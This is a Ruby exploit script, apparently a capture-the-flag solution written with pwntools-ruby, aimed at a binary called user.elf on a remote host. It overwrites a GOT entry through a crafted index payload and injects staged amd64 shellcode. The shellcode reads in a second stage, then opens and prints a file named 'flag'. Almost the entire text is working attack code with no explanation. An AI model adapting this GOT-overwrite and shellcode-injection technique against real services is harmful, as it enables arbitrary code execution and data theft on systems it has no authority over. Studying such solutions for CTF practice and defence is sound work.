#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '35.200.23.198', 31733
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
# $z = Tubes::Process.new('../release/user.elf')
def z;$z;end
@p = '../release/user.elf'
# def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = 'amd64'

stack_at = 0x2020a4
shellcode_at = 0x2030a4 + 20
target = elf.got.write
payload = "#{(stack_at - target) / 4 - 2}_\\" # top = -xx s.t. stack[top] @ got.printf
payload << 'h:'

payload << "#{shellcode_at - (elf.plt.write + 6)}+h;"

payload << ','

payload = payload.ljust(20, '?')
payload << asm(
  "lea rbp, [rip + shellcode]\n" +
  shellcraft.syscall('SYS_read', 0, 'rbp', 2048) +
  "nop\nnop\nnop\nnop\nshellcode:\n"
)
log.dump payload
fail if payload =~ /\s/
z.puts payload
sleep(0.1)

shellcode = asm(
  shellcraft.pushstr('flag') +
  shellcraft.syscall('SYS_open', 'rsp', 0) + "sub rbp, 0x400\n" +
  shellcraft.syscall('SYS_read', 'rax', 'rbp', 0x100) +
  shellcraft.syscall('SYS_write', 1, 'rbp', 'rax')
)

z.write shellcode
z.interact
